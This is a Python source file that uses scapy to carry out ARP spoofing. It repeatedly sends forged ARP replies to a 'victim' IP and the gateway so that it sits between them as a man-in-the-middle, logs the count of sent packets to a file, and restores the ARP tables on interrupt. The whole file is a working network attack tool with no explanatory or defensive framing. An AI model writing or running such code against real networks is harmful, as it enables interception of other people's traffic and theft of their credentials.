
import sys
sys.path.append("C:\\Users\\User\Documents\To The Distance\Python\Lib\site-packages\scapy")

import scapy.all as scapy
import argparse
import time
import threading

#gw = sys.argv[1]
#victim = sys.argv[2]

RUN = True

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Specify target ip")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Specify spoof ip")
    return parser.parse_args()

def get_mac(ip):
    arp_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast_packet = broadcast_packet/arp_packet
    answered_list = scapy.srp(arp_broadcast_packet, timeout=3, verbose=False)[0]
    return answered_list[0][1].hwsrc

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, 4)

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def main(gw, victim, filepath):
    global RUN
    sent_packets = 0

    if RUN:
        try:
            while RUN:
                try:
                    spoof(victim, gw)
                    spoof(gw, victim)
                    sent_packets += 2
                    with open(filepath, "w") as arp_file:
                        arp_file.write("[+] Sent packets: " + str(sent_packets))
                    time.sleep(1)
                except IndexError:
                    with open(filepath, "w") as arp_file:
                        arp_file.write("[-] Failed .. trying again ... ")

        except KeyboardInterrupt:
            print("\n[-] Ctrl + C detected.....Restoring ARP Tables Please Wait!")
            restore(victim,gw)
            restore(gw, victim)
    elif not RUN:
        print("Stopped ... \n")
        return 0

